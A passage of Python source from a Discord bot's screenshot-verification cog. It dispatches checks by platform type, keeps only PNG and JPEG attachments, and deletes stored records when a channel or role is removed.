                _e.description += await record.verify_yt(ctx, _)

            elif record.ss_type == SSType.insta:
                _e.description += await record.verify_insta(ctx, _)

            elif record.ss_type == SSType.loco:
                _e.description += await record.verify_loco(ctx, _)

            elif record.ss_type == SSType.rooter:
                _e.description += await record.verify_rooter(ctx, _)

            elif record.ss_type == SSType.custom:
                _e.description += await record.verify_custom(ctx, _)

        return _e

    def __valid_attachments(self, message: discord.Message):
        return [_ for _ in message.attachments if _.content_type in ("image/png", "image/jpeg", "image/jpg")]

    @Cog.listener()
    async def on_guild_channel_delete(self, channel: discord.TextChannel):
        if channel.id in self.bot.cache.ssverify_channels:
            record = await SSVerify.get_or_none(channel_id=channel.id)
            if record:
                await record.full_delete()

    @Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role):
        records = await SSVerify.filter(role_id=role.id)
        if records:
            for record in records:
                await record.full_delete()
